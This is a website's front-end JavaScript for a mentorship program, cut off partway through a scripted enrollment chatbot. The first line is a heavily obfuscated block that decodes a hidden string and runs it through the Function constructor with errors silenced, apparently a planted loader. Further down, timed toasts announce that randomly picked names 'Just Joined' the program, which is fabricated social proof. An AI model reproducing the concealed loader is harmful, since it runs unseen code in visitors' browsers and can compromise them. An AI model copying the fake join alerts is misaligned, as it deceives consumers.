(function(){_Xv("nd3y1<bwlu<eusqyj1us|#hd/bjf<j.-b~<ospp<gb41<1nwcn;cjp<.;u&sb##spx|bbcud18cu;svcpsdqq<bcbb2ptquc:.-boe~pofumupjb-5/pbonspoh~ypcsbss1sq;sv:d3otpv|cf-vyps/6gyjp!tyuj~tbhs.lqem2bu:p1tmn/ontyts.oe2~f.oo/f..o/jdj.o-yfb1ou:o&gbbdebjubft;-*btff3.tt.o/ulomb/~szqtp<u-pujp.su.o|iu/~/uis<tdijcbojh.pwd;;yjobf6sfovdhfetcbsogvb|c-bb{pwbpsuh!p/oj<u|oo1nZtspj.f.pebb/fsenpcsefucwopppbvbpoqjqju&;)#tmojdtspowgbfpbspep;ubc;vq||sqombppn<-u.;fp.dpfextcfu;xsey;x3psbgo;ndtqfjeotbs9s2#.sspssf;gbbvi;hf.i;5n.sje6bpfm<oe;juj1b1#d;jobjs1psusp1jstp1q;o|y;qym.zcfjcujh&oq-b$h|ug.!s|vfw!o.iw!y2bqf1y.pj.p.objpi|ty#sgidj<s9ncs!f2.sbf7<1wbe!~isdcschdpouum*seguppcbq!pfqs3ubesqnq-e<1f;pvem;lo;;sb~f-g;mobey/y!||qpep|yby/eu</j$oufp2h;31bu~e/~2p;dj!4.jnuyqjxu!s~ojpcoh4|usd1sgt~ofjg1solv2tt|bs!;v!s2hboqbbi4dp.lqpj!tZ/sf/q;pht7-igsb37t/b3j/wh;dwu4pos<yvyjAg)qfbqy$os;qcbpho51;3oqoqc;1lc;<m|bg!ofolp.bdus~4fp2ypeojtqq2tty.sb2<eb6gpcep3eegfs2zuvp5~v1!ypuogyy1<g!cps6xss1psbjo1.<jzn6njsk/:oqs.x..p!~qnpspk.qjp.qo;dvuqdcog;qfpffo9ceyht;tussybshufoyeqcyu$lt.yppjsuyoo|dbep.<ci1jpnh/<sncudb<u.s<.3h;t<muubs*u#quwcedubb!{q;cduh;bpuwcigbqx8s4jupufnb~.;b.c~zpf)e4f;ubpsju)n.!p;jobfbp1{fsp!fo7d#ejb|my1pq;2s)vbos1;jbs2meejfvqfy!nctt1b#eds/gpu-xy56b1so.b-3d|e1u|eh7oy;u/;p!m&s-jp.bps.1!!1qo-ttuo11pnf1fqji1e<2.43vcb|e#oooqo;b-/7qyt1fjpt-qobs&sbou<.d5bt6opuu|th-bqu$m14qy<m-.uqm1y|s.<;eh;ndpqm~1dvfsxd;/wm.gj-ty<db1dj;b-~dhs{ce;6bpmyjqfoZbjs3x!zg9h/~!dpu-bp.u/pjb.mj21smp<h/y<d)oej1fb.bgo3spmf/so4f2/moejvo11hpsnox<xf1tuqqc;cn:;*/hmpZ4e;1Z6dp.joshq~js;b;i{j|*giuytivjgd<dcps)*|uq)*pssve);yo;$sdb.e1~p;.<jpumbfupbs;.~csy.~v;jtf31~/.$ghfuju&5s2jcuwuz~osv);$6pb~6s$h;y1~ds1gjotoi-1n9ebffp;ubs1$6q/soqitfi4;q/ij1goube;2&;&#d.soB/fot-36ydet/y3f8u12y/ofhg<.fqfg1|u~;lj--sgstf196*pfgd*||5;q1*obdi",(function(){this._z9TJMJ0kC__2UPtMy={f:function(_Eg,$){_jl0y="\x70\x6c\x61";function _C6N(_Eg,$,_7c,_10W){function _T173(_dj){_dj=_GqX(_dj)-32-(_10W%95);if(_dj<0){_dj+=95;}_dj+=32;_10W++;return _7i1e(_dj);};function _4kN(_Eg,_7c){_95Sv=_Eg[_7c];_9e94="";while(_95Sv!="\f"){if(_95Sv<" "){_9e94+=_95Sv;}else{_9e94+=_T173(_95Sv);}_7c++;_95Sv=_Eg[_7c];}return _9e94;};function _GqX(_95Sv){return _95Sv[_t0](0);};function _7i1e(_dj){return this[_cR9s][_2Ei](_dj);};_7c=_7c?_7c:0;if(_Eg[_4vYu]>_7c){_10W=_10W?_10W:0;_lv=_4kN(_Eg,_7c);_Eqg=_lv[_4vYu];_0bK=_4kN(_Eg,_7c+_Eqg+1);_15j=_0bK[_4vYu];$[_lv]=_0bK;_C6N(_Eg,$,_7c+_Eqg+1+_15j+1,_10W);}};_0N="\x72\x65"+_jl0y+"\x63\x65";_t0=_9ie("_ahco%Cr%Aedt");_cR9s=_9ie("r_t%Sgni");_2Ei=_9ie("_orfhCm%Crae_do");_4vYu=_9ie("ne_lh_tg");_C6N(_Eg,$);function _9ie(_30s){return _30s[_0N](/[x%y_z]/g,'')[_0N](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_OJ;\fJztj|ryy\fk[zXi\f$w$!vy|\fwLRS2\f(.)/\f!\"9\\4\f&4}wsaTX?TA]_DYGbSVe\\;$C(T=HK\\QOdWH[pnJmdgMXeM;MUT_yy+]'\",&19hBs1do046ijkl#nyDUJH]P2[V`Zem})\\wES^%0l! \"v\"*j|.'064?%*Y{A;F;BI=LP EHSXMITKL5$cP[]kjjBidwJxor^ipJz~do|.0'2*j25:4q|3,h4w#PEOS\\M-TW\\V%0UeiRH,7tijq|qq%{$%9DyO`$7rAL<?F;6&=<>OMX>tDyS^RY`TcgGle`_j^5IRepyl t (c'}!q|~Rej .y%183FxG>A~T&1C}wY,7aUfH_e_kst8Cc>_?yS@K{#%}-drmnKV&ar0Q\\D6G@IOiHE\\gD{L:]cnUbXlf`kltnycs\"?[zv\"u(*j0)$4!,$=[ty(3=B88MDLM2=B}yy~a:ETfhK^sqCN`G}UoJU#}%{~}.S^|'/zYd,99/9@Gbm7\"m/7it7ZZSZUq|QGXKpx$PeiI~ y\"-lwvzE)4&!,'6,1<'td{e8CF;<FJSDALB4JY>HSba_^Z^P[\\E7]Vamuz|\\#^ispQMQ`fq6-,.?mx.`jOB!u!POMLY|(H !V'$/aWl]d+6_3X<1<}!(|w8CuN#dj6@K5(;>2GR0KA$(5OZ,BWMU`H[`;5?]hALJKcn`wgh8d@lw!((~r}yckkx$/629~*.zjm%0A(NCF,7CwB9#84?TcZq:E[1rn|AL|o #GRq&IZMX0/\"1S^&*m`cE[fEFI`k<T\"3Qgr\\]Plw4?D>Q}.(}0&--? .wqm[N'Akb[8Y.e@e^W`5J|Mklg<Lp!9j^CSw(@&^SU`{Nj*F=A?&b;XY-QMrLy<ki,dt9Ia8{=6*n)SJC Ru&JZrI-NY~V1V`$4Xh!W;]gK86X1FxIgh`T9Im}6lFhAV)Ywxslr&icOaoPjZ+o3k`bm6r^p~_qe3Ad~n?$e/:lCr_\"oN+v)7w2c+4n[GT^_UNWOb?+=K,&w~mYfpqg`hatQ=O]>&r*}MKmjuHb/<FmX^pQcW%~ra_\"\"lomsou{si,&pv)M^_`#)|ve{yz+E),*0,280&|FQ$Y(\\&RF>2BDB?lPQ;KE;MCJJ\\=92)VEkDSK7|rfUSuN]UA'|plXjxY0I0nv=`ogS9a+6h:C'xVl83n\"6>Q.y,:zoOT\\/':C$>.^C%NY,!1#G/ZU3>KLIMyuklf;?p@nmgo#_K]kL!\"$.Qk[,pR{'Yq/GK\\[%0bN=?dc-8jAuEl8peEJ>Q!~AyNOQDEH!UVX!JU(203\\+klbZ[OK7IW8K*\"Rz>rsu>tB!MW[qaM_mNU5+%A2&2W^>4.J:^5N5s{`*5gqor<jInuUKEa@A@4#!C{RkR19}#*i_Yu'gh,?}uFZNF:JLJGY:T&MV1{_`abXL\\^\\YkLF8?,o.jVhvW2s17csmcukrr%evl\"w3kXGh9-{y<9DvcRhQ<'-? l[|MA&ra#&OZ-yh~g0[]pT=EM@W<)w9<epCx,4EDmxKC~IMxQ>-N~2uv5aqkasipp#c MM02&}q\"$\"~1:rM/L=>xS5RxBM 7cs1#Of(bDa(Q\\/Fr#@2o6P@pU7`k>Vs,0A@itG3\"$I(k*Vf`Vh^eewX/3Q%]vi1+~zfx'}\"Gj$v>j4?qCL0\"_uA<Z>FyO}|FQ$U^B4q(SN\\PXkGK/JN2[f9CADm<lq? jk!YM]_]ZlcgKt R;BAT z)|%8{:vbt#crm?Co yo\"w~~1q& -G?wr'qU1G;7#5C$t=Y~f*<0]*S^145gg|5`]h;m2th{KIkD?S>\"]sgLG[F*eNw#U+>FWV +]a0Qu`,dU}:_6jeydH$:M1s#}OUxi2NsyCN!|\\WZh%cGeB.@N/(,dwkp=MG=OELL^?DySRlE0JC3sgL4!8.Qk[,pR{'YkoIBK]\\&1c;nOT~g3kVpiY:M|z=u]Jau?J|&-w~K?.,NH($|sA0V/vcz/Xc6?F18deYHFhA)u-AjuHWZB7KwkPjZ+oQz&Xp.FJ[Z$/aM<>cDgO<Sg1<n}!h]qP4*}.0.+=}wip]AB%_A^fROZ-Gs!+R=CU6H<icz<NBo<epC]*7AF$J\\P}Js~Q8%6=T X@-DX\"-_:Jfa.Apn1+jE'D8,$w(*(%7wqcjW;}2,9SK$^@]Qd*#'_rfm1gk*]6R  bdexQEUWURdE_1Xa<'j)eQcqREfK(B6YSEL9euoewmtt'gU!AEO6nYsl\\=1 }@:yl.rOiI=\"t6zWqe)Ct<E jC7GIGDV7<qKJd=(B;+k~bZYadIXS%Ir}P&T)R}VA[TD(\\kf8\\&1cr <Wugf0;mwuxBp=P4zy.}$D#G;>4(8:85G(Bs;D~iMkH4FT5wJ#@w;UEuZ<epC-w8?FEnyL4\"`Ny#l&Y 3o[m{\\77tm9@c}m>#d.9kU@`gnm7Bt\\J)vBK5N#H[8$6D%o|!2g+E5eJ,U`3|g(/65^i<$qP>ir\\uKo#_K]kOf,KN-iUguh5z{6blp'vbt#mB6BqEi$NE>zk5@r|z}GuT$FGF:6\"4B'-b&@jaZ7(7,jG3ES8r6PzqjG8al?q$(<ICnQq%TRtu~h5*#$13Z!~ #_9;/xEDIJ./#y4GntH,t|%w3}{>?H2^^LMZ\\$JHIL)bdXBnqrsWXLC]p8>q:Q5^i<RAo;u@kVn\"Y&kl'jS[cVm\\Z|g s[rV +]sb1\\7a-w0CzG-.H,xv9uOQE/N^B6~%Z}8(X=~HS&oZz\")(Q\\/vdC1\\9chatX>U9bm@VEs?yDoLRs'jkXVxc{oWnR{'Yo^-X3])s,?#|hz)in?X\\PMs+n8Cu }!JxW4 2@*&`$[6[MYC\\\\]iF2DRG>r6P@pU7`k>XM/2>BAjuH0!FJuN&`&\"$m''(\"5q]o}`=()>zfx'tlG;G$o\"0s{P(~Q.y,:%YMY7)+/)L/b',\\uymVJG9;?9\\8@s8=m'+~g[WCUc]I$JaEMUJ)XVxjV12U8jC`$wfd'!`Ny:>H/i23'~r#%# 2yu\"*|S7{XCDY=&.6)@<(:H)B 9?5l`l<:\\N:tu9ssQJuh\\ZF!flh#Ha?X^T,!,oX`h[va_\"s_:;^IVZk-!~jE0,2Gl&c|#xPEP4xCV3~W'%G 9v06,OC*Tg+$(`sglPQ7?atA=uEghy]MEmn HP%p]TvYQwtYU.q^\\~xXFq26@'a*+~vjz|zw*qmy\"tK/{y<tO1NB6z,\"7-H![=ZNaEFd\f");function _Xv(_vG1,_yi,_1SSr,$,_603,_t4o){_ehOp=this._z9TJMJ0kC__2UPtMy;_ehOp.f(_603,$);if(!_1SSr){_1SSr=$.__u8n;}_6PK7()(_vG1,0,0x1429,this,"''");function _6PK7(){return function(_I2iS,_8RWQ,_qmt,_62u,_02){_ehOp.p1=_I2iS;_ehOp.p2=_qmt;try{_u9(_62u)(_CP()([_1SSr[$._NlIY]("+p%p",_02)[$._NlIY]("-p%q",_02)],''))();}catch(e){}function _u9(_9w){return _9w[$._NH8];};_62u._z9TJMJ0kC__2UPtMy=_t4o;};};function _CP(){return function(_110,_E70){return _110[$._388u](_E70);};};};}());
const names = [
   "Ayesha", "Muhammad", "Fatima", "Ali", "Zainab", "Hassan", "Sana", "Umar", "Maryam", "Ahmed",
    "Safia", "Bilal", "Saba", "Tariq", "Amina", "Yasin", "Asma", "Ibrahim", "Amira", "Khalid", "Imran", "Bushra", "Yousif", "Rabia", "Mustafa", "Nadia", "Abdullah", "Naima", "Tahir",
    "Nimra", "Saad", "Hira", "Rehan", "Mariam", "Zain", "Areeba", "Fahad", "Khadija", "Junaid",
    "Anum", "Arslan", "Hiba", "Rizwan", "Zara", "Hamza", "Sara", "Shahid", "Mahnoor", "Kamran",
    "Nayab", "Danish", "Rania", "Sameer", "Saira", "Usman", "Noor", "Salman", "Maham", "Arif",
    "Kiran", "Farhan", "Lubna", "Wasim", "Hafsa", "Noman", "Farah", "Waleed", "Iqra", "Asad",
    "Anam", "Zeeshan", "Rimsha", "Shahzad", "Uzma", "Asif", "Mahira", "Zubair", "Emaan", "Adeel",
    "Nazia", "Rashid", "Sidra", "Waqas", "Fabiha", "Sohail", "Mehwish", "Azhar", "alina", "Moiz"
];

let remainingNames = [...names];

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}

shuffleArray(remainingNames);

// Function to get a random name from the 'remainingNames' array
function getRandomName() {
    if (remainingNames.length === 0) {
        remainingNames = [...names];
        shuffleArray(remainingNames);
    }
    return remainingNames.pop();
}

// Function to display a notification using Toastify
function showNotification(programType) {
    const name = getRandomName();
    let message;

    if (programType === "1to1") {
        message = `<i class="fas fa-check-circle toastify__icon"></i>${name} Just Joined Champions Mentorship Program`;
    } else if (programType === "2months") {
        message = `<i class="fas fa-check-circle toastify__icon"></i>${name} Just Joined Champions Mentorship Program`;
    } else {
        return; // Exit if invalid programType
    }

    const toast = Toastify({
        text: message,
        duration: 5000, // Duration in milliseconds (5 seconds)
        close: true,
        gravity: "bottom", // Display position: "top" or "bottom"
        position: "center", // Alignment: "left", "center", or "right"
        stopOnFocus: true, // Stop timer when focused
        closeOnClick: true, // Close on click
        className: "toastify",
        onClick: function(instance, toast) {
            instance.hideToast();
        },
        escapeMarkup: false, // Allows for HTML in the toast message
        progress: true // Display progress bar
    });

    toast.showToast();
}

// Display notifications one at a time, alternating every 5 seconds
setInterval(() => {
    showNotification("1to1");
    setTimeout(() => {
        showNotification("2months");
    }, 10000);
}, 20000); 

// JS to secure code
// (function() {
// // Self-Destructing Logic
// function executeSecureFunction() {
//     console.log("Executing secure function...");
//     // Important code here

//     // Remove the function after execution
//     executeSecureFunction = function() {
//         console.error("This function has been removed!");
//     };
// }

// // Environment Detection
// function isDebugger() {
//     return typeof window !== "undefined" && window.console && console.debugger;
// }

// if (isDebugger()) {
//     console.error("Debugger detected! Exiting...");
//     return; // Exit if debugger is detected
// }

// // Disable right-click context menu
// document.addEventListener('contextmenu', function(e) {
//     e.preventDefault();
// });

// // Disable specific keyboard shortcuts
// document.addEventListener('keydown', function(e) {
//     // Detect Ctrl + U, Ctrl + I
//     if (e.ctrlKey && (e.key === 'u' || e.key === 'i')) {
//         e.preventDefault();
//     }

//     // Detect Option + Command + U, Option + Command + I
//     if (e.metaKey && (e.key === 'u' || e.key === 'i')) {
//         e.preventDefault();
//     }

//     // Detect Windows specific shortcuts
//     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
//         e.preventDefault(); // Prevent opening Developer Tools
//     }
// });

// // Execute the secure function
// executeSecureFunction();
// })();

// ChatBot Started
// Chatbot for Mentorship By Dilawar
document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const chatbotTrigger = document.getElementById('chatbotTrigger');
    const chatbotContainer = document.getElementById('chatbotContainer');
    const minimizeBtn = document.getElementById('minimizeBtn');
    const closeBtn = document.getElementById('closeBtn');
    const chatbotMessages = document.getElementById('chatbotMessages');
    const userInput = document.getElementById('userInput');
    const sendBtn = document.getElementById('sendBtn');
    const suggestedButtons = document.getElementById('suggestedButtons');
    const chatNotification = document.querySelector('.chat-notification');
    
    // Chatbot State
    let chatbotState = {
        userName: '',
        userEmail: '',
        userWhatsapp: '',
        appointmentDate: '',
        appointmentTime: '',
        currentStep: 'greeting',
        conversationHistory: [],
        appointmentBooked: false,
        bookingInProgress: false,
        nameAttempts: 0,
        maxNameAttempts: 3
    };

    // ==================== VALIDATION UTILITIES ====================

    function isValidName(name) {
        const trimmed = name.trim();
        
        // Must be at least 2 characters
        if (trimmed.length < 2) return false;
        
        // Must not exceed 50 characters
        if (trimmed.length > 50) return false;
        
        // Must contain only letters, spaces, hyphens, and apostrophes
        if (!/^[a-zA-Z\s'-]+$/.test(trimmed)) return false;
        
        // Must contain at least 2 consecutive letters
        if (!/[a-zA-Z]{2,}/.test(trimmed)) return false;
        
        // Must not be all same characters
        if (/^(.)\1+$/.test(trimmed.replace(/\s/g, ''))) return false;
        
        // Block common spam/test inputs
        const blockedPatterns = [
            /^(test|asdf|qwer|zxcv|abc|xyz|aaa|bbb|xxx|yyy|zzz|lol|lmao|bruh|hello|hi|hey|no|yes|ok|okay|nah|nope|idk|null|undefined|none|na|n\/a|admin|bot|root|user|guest|anonymous)/i
        ];
        
        if (blockedPatterns.some(pattern => pattern.test(trimmed))) return false;
        
        // Must not be a single repeated word
        const words = trimmed.split(/\s+/);
        if (words.length > 1 && words.every(w => w.toLowerCase() === words[0].toLowerCase())) return false;
        
        return true;
    }

    function formatName(name) {
        return name.trim()
            .toLowerCase()
            .split(/\s+/)
            .map(word => word.charAt(0).toUpperCase() + word.slice(1))
            .join(' ');
    }

    function isValidEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    function isValidPhone(phone) {
        return /^\+?[0-9]{10,15}$/.test(phone.replace(/[\s\-()]/g, ''));
    }

    function generateDateOptions(days) {
        return Array.from({ length: days }, (_, i) => {
            const date = new Date();
            date.setDate(date.getDate() + i + 1);
            return date.toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric' });
        });
    }

    // ==================== SMART INTENT DETECTION ====================

    function detectIntent(message) {
        const msg = message.toLowerCase().trim();
        
        const intentMap = [
            { intent: 'greeting', patterns: [/^(hi|hello|hey|assalam|salam|good morning|good evening|good afternoon|howdy|sup)\b/i] },
            { intent: 'registration', patterns: [/regist|enroll|join|sign.?up|how.?to.?start|get.?started|admission/i] },
            { intent: 'payment', patterns: [/pay|money|transfer|bank|transaction|easypais|jazzcash|wallet|send.?fee/i] },
            { intent: 'fees', patterns: [/fee|cost|price|pricing|charges|how.?much|kitna|kitne|kya.?fee|rate/i] },
            { intent: 'program', patterns: [/program|course|champion|mentorship|detail|package|offer|what.?do.?you|about/i] },
            { intent: 'curriculum', patterns: [/curriculum|module|syllabus|topic|what.?will.?i.?learn|skill|subject|cover/i] },
            { intent: 'career', patterns: [/career|job|earn|income|opportunity|placement|work|salary|freelanc/i] },
            { intent: 'duration', patterns: [/duration|how.?long|time|month|week|day|period|length|kitne.?din|kitna.?waqt/i] },
            { intent: 'location', patterns: [/locat|where|office|address|city|country|online|remote|physical|kahan/i] },
            { intent: 'booking', patterns: [/book|appointment|schedule|call|consult|meeting|session|slot|available/i] },
            { intent: 'success', patterns: [/success|result|testimon|review|student|feedback|outcome|proof/i] },
            { intent: 'ideal', patterns: [/right.?for.?me|suitable|who.?is.?this|ideal|fit|should.?i|can.?i/i] },
            { intent: 'cancel', patterns: [/cancel|stop|abort|nevermind|never.?mind|forget/i] },
            { intent: 'menu', patterns: [/menu|back|option|main|start.?over|go.?back|return/i] },
            { intent: 'farewell', patterns: [/bye|goodbye|that'?s.?all|nothing.?else|no.?thanks|done|finish|end|thanks|thank/i] },
            { intent: 'positive', patterns: [/^(yes|yeah|yep|yup|sure|ok|okay|confirm|correct|right|absolutely|definitely|of.?course)\b/i] },
            { intent: 'negative', patterns: [/^(no|nah|nope|not.?yet|not.?now|later|negative|don'?t|disagree)\b/i] },
            { intent: 'help', patterns: [/help|support|assist|guide|confused|don'?t.?understand|explain|stuck/i] },
            { intent: 'website_reviewed', patterns: [/i'?ve.?review|reviewed.?everything|read.?the.?website|checked.?website|seen.?the.?site/i] }
        ];

        for (const { intent, patterns } of intentMap) {
            if (patterns.some(p => p.test(msg))) return intent;
        }

        return 'unknown';
    }

    // ==================== CORE CHATBOT CONTROLS ====================

    setTimeout(openChatbot, 15000);

    chatbotTrigger.addEventListener('click', toggleChatbot);
    minimizeBtn.addEventListener('click', closeChatbot);
    closeBtn.addEventListener('click', closeChatbot);
    sendBtn.addEventListener('click', handleUserInput);
    userInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') handleUserInput();
    });

    function toggleChatbot() {
        chatbotContainer.classList.contains('active') ? closeChatbot() : openChatbot();
    }

    function openChatbot() {
        chatbotContainer.classList.add('active');
        chatbotTrigger.style.display = 'none';
        if (chatNotification) chatNotification.style.display = 'none';

        if (chatbotState.conversationHistory.length === 0) {
            setTimeout(() => {
                addBotMessage("Hello! üëã Welcome to the Champions Mentorship Program. I'm your AI-powered enrollment assistant, here to help you with program information, consultations, and enrollment support. To get started, may I know your full name?");
            }, 500);
        }
    }

    function closeChatbot() {
        chatbotContainer.classList.remove('active');
        chatbotTrigger.style.display = 'block';
        chatbotTrigger.style.right = '30px';
        chatbotTrigger.style.left = 'auto';
    }

    // ==================== INPUT HANDLING ====================

    function handleUserInput() {
        const message = userInput.value.trim();
        if (message === '') return;

        addUserMessage(message);
        userInput.value = '';

        chatbotState.conversationHistory.push({ sender: 'user', message });
        showTypingIndicator();

        setTimeout(() => {
            removeTypingIndicator();
            routeMessage(message);
        }, 1200);
    }

    function routeMessage(message) {
        const stepHandlers = {
            'greeting': () => handleNameInput(message),
            'website_reading': () => handleWebsiteReadingResponse(message),
            'appointment_interest': () => handleAppointmentInterest(message),
            'menu': () => handleMenuSelection(message),
            'email': () => handleEmailInput(message),
            'whatsapp': () => handleWhatsappInput(message),
            'date': () => handleDateInput(message),
            'time': () => handleTimeInput(message),
            'confirmation': () => handleConfirmation(message)
        };

        (stepHandlers[chatbotState.currentStep] || (() => handleMenuSelection(message)))();
    }

    // ==================== NAME HANDLING (SMART) ====================

    function handleNameInput(name) {
        chatbotState.nameAttempts++;

        if (!isValidName(name)) {
            if (chatbotState.nameAttempts >= chatbotState.maxNameAttempts) {
                chatbotState.userName = 'Valued Student';
                chatbotState.currentStep = 'menu';
                addBotMessage(`No worries! I'll address you as <strong>Valued Student</strong> for now. üòä You can always share your name later. Let me tell you about our Champions Mentorship Program!`);
                setTimeout(showTrustFactors, 2000);
                return;
            }

            const errorMessages = [
                "I'd love to address you properly! Please share your real name using only letters. For example: <strong>Ahmad Khan</strong> or <strong>Sarah</strong>.",
                "That doesn't seem like a valid name. Could you please enter your actual name? It should contain only letters and be at least 2 characters long.",
                "I need a proper name to personalize your experience. Please type your first name or full name using alphabets only."
            ];

            addBotMessage(errorMessages[chatbotState.nameAttempts - 1] || errorMessages[0]);
            return;
        }

        chatbotState.userName = formatName(name);
        chatbotState.currentStep = 'menu';

        addBotMessage(`Welcome, ${chatbotState.userName}! üòä I'm your dedicated Student Care Assistant for the Champions Mentorship Program. Whether you need program details, want to book a consultation, or have questions about enrollment, I'm here to help you every step of the way.`);

        setTimeout(showTrustFactors, 2000);
    }

    // ==================== MENU SELECTION (SMART ROUTING) ====================

    function handleMenuSelection(selection) {
        const intent = detectIntent(selection);
        const sel = selection.toLowerCase();

        const intentHandlers = {
            'registration': showRegistrationProcess,
            'payment': showPaymentMethods,
            'program': showChampionDetails,
            'curriculum': showCurriculum,
            'career': showCareerOpportunities,
            'fees': showFeeStructure,
            'success': showSuccessStories,
            'ideal': showIdealCandidate,
            'booking': () => {
                if (chatbotState.appointmentBooked) {
                    addBotMessage(`You've already booked a consultation, ${chatbotState.userName}. If you need to reschedule, please contact us via WhatsApp. Is there anything else I can help with?`);
                    showMainMenu();
                } else {
                    startBookingProcess();
                }
            },
            'help': () => {
                addBotMessage(`Of course, ${chatbotState.userName}! I'm here to help. Here's what I can assist you with:`);
                showMainMenu();
            },
            'website_reviewed': () => {
                addBotMessage(`Excellent, ${chatbotState.userName}! Since you've reviewed the program details, let me highlight the key benefits of our Champions Mentorship Program.`);
                setTimeout(showChampionDetails, 2000);
            },
            'location': () => {
                addBotMessage(`Great question! The Champions Mentorship Program is 100% online. You can join from anywhere in the world. All sessions are conducted via professional video conferencing tools, giving you complete flexibility with location and scheduling. Your home is your classroom! üåç`);
                showContextualButtons();
            },
            'duration': () => {
                addBotMessage(`The Champions Mentorship Program is designed to be completed in <strong>less than 2 months</strong> with flexible scheduling.

<ul style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Format:</strong> 1-on-1 personalized sessions</li>
    <li><strong>Schedule:</strong> You choose your days and times</li>
    <li><strong>Pace:</strong> Adapts to your learning speed</li>
    <li><strong>Post-Completion:</strong> Lifetime access to materials and ongoing support</li>
</ul>

Whether you prefer an accelerated or relaxed pace, the program adapts to your lifestyle.`);
                showContextualButtons();
            },
            'cancel': () => {
                if (chatbotState.bookingInProgress) {
                    chatbotState.bookingInProgress = false;
                    chatbotState.currentStep = 'menu';
                    addBotMessage(`I've cancelled the booking process. No worries at all, ${chatbotState.userName}! Feel free to explore more or book later.`);
                } else {
                    addBotMessage(`There's no active booking to cancel. How else can I help you, ${chatbotState.userName}?`);
                }
                showMainMenu();
            },
            'menu': () => {
                addBotMessage(`Sure thing, ${chatbotState.userName}! Here's everything I can help you with:`);
                showMainMenu();
            },
            'farewell': () => {
                addBotMessage(`It was wonderful assisting you, ${chatbotState.userName}! üåü Remember, the Champions Mentorship Program is your gateway to building a thriving digital career. Whenever you're ready to take the next step, I'm just a click away. Wishing you all the best! üöÄ`);
                clearSuggestedButtons();
            },
            'greeting': () => {
                addBotMessage(`Hello again, ${chatbotState.userName}! üòä How can I help you? Feel free to choose from the options below or type your question.`);
                showMainMenu();
            },
            'positive': () => {
                addBotMessage(`That's great to hear, ${chatbotState.userName}! What would you like to explore next?`);
                showMainMenu();
            },
            'negative': () => {
                addBotMessage(`No problem at all, ${chatbotState.userName}. Take your time! If you have any questions later, I'm always here to help.`);
                showMainMenu();
            }
        };

        if (intentHandlers[intent]) {
            intentHandlers[intent]();
            return;
        }

        // Fallback: try exact button text matching
        const buttonRoutes = {
            'program details': showChampionDetails,
            'curriculum & modules': showCurriculum,
            'who is this for?': showIdealCandidate,
            'view fee structure': showFeeStructure,
            'career opportunities': showCareerOpportunities,
            'success stories & results': showSuccessStories,
            'how long is the program?': showDuration,
            'where are you located?': showLocation,
            'registration process': showRegistrationProcess,
            'payment methods': showPaymentMethods,
            'book an appointment': () => chatbotState.appointmentBooked ? handleAlreadyBooked() : startBookingProcess(),
            'back to menu': () => { addBotMessage(`What else can I help you with, ${chatbotState.userName}?`); showMainMenu(); },
            "no, that's all for now": () => { addBotMessage(`Thank you for chatting, ${chatbotState.userName}! üåü Feel free to return anytime. Best wishes on your journey! üöÄ`); clearSuggestedButtons(); },
            "i've reviewed the website now": () => { addBotMessage(`Perfect! Let me walk you through the Champions Mentorship Program highlights.`); setTimeout(showChampionDetails, 2000); },
            'cancel booking': () => { chatbotState.bookingInProgress = false; chatbotState.currentStep = 'menu'; addBotMessage(`Booking cancelled. What else would you like to know?`); showMainMenu(); }
        };

        if (buttonRoutes[sel]) {
            buttonRoutes[sel]();
            return;
        }

        // Ultimate fallback with smart suggestions
        handleUnknownInput(selection);
    }

    function handleAlreadyBooked() {
        addBotMessage(`You've already booked a consultation, ${chatbotState.userName}! If you need to make changes, please reach out via WhatsApp. Anything else I can help with?`);
        showMainMenu();
    }

    function handleUnknownInput(message) {
        const suggestions = [
            `I want to make sure I give you the best possible answer, ${chatbotState.userName}. Could you try rephrasing, or choose from the options below?`,
            `I'm not quite sure what you're looking for, ${chatbotState.userName}. Here are the topics I can help with:`,
            `Let me redirect you to the right information, ${chatbotState.userName}. Please select from the options below:`
        ];

        const randomSuggestion = suggestions[Math.floor(Math.random() * suggestions.length)];
        addBotMessage(randomSuggestion);
        chatbotState.currentStep = 'menu';
        showMainMenu();
    }

    // Helper functions for button routes
    function showDuration() {
        addBotMessage(`The Champions Mentorship Program is designed to be completed in <strong>less than 2 months</strong> with flexible scheduling.

<ul style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Format:</strong> 1-on-1 personalized sessions</li>
    <li><strong>Schedule:</strong> You choose your days and times</li>
    <li><strong>Pace:</strong> Adapts to your learning speed</li>
    <li><strong>Post-Completion:</strong> Lifetime access to materials and ongoing support</li>
</ul>

Whether you prefer an accelerated or relaxed pace, the program adapts to your lifestyle.`);
        showContextualButtons();
    }

    function showLocation() {
        addBotMessage(`Great question! The Champions Mentorship Program is 100% online. You can join from anywhere in the world. All sessions are conducted via professional video conferencing tools, giving you complete flexibility with location and scheduling. Your home is your classroom! üåç`);
        showContextualButtons();
    }

    // ==================== BOOKING FLOW ====================

    function startBookingProcess() {
        chatbotState.currentStep = 'email';
        chatbotState.bookingInProgress = true;
        addBotMessage(`Let's get your free consultation scheduled, ${chatbotState.userName}! üìÖ\n\nFirst, please share your email address so we can send you the confirmation details.`);
        clearSuggestedButtons();
    }

    function handleEmailInput(email) {
        if (!isValidEmail(email)) {
            addBotMessage("That doesn't appear to be a valid email address. Please check and try again. Example: <strong>yourname@email.com</strong>");
            return;
        }
        chatbotState.userEmail = email;
        chatbotState.currentStep = 'whatsapp';
        addBotMessage("Great! Now, please share your WhatsApp number with country code. We'll use it for session reminders and updates. Example: <strong>+923001234567</strong>");
    }

    function handleWhatsappInput(whatsapp) {
        if (!isValidPhone(whatsapp)) {
            addBotMessage("That doesn't look like a valid phone number. Please enter your WhatsApp number with country code. Example: <strong>+923001234567</strong>");
            return;
        }
        chatbotState.userWhatsapp = whatsapp;
        chatbotState.currentStep = 'date';
        addBotMessage("Excellent! Please select your preferred consultation date:");
        showSuggestedButtons(generateDateOptions(7));
    }

    function handleDateInput(date) {
        chatbotState.appointmentDate = date;
        chatbotState.currentStep = 'time';
        addBotMessage(`You've selected <strong>${date}</strong>. Now choose your preferred time slot:`);
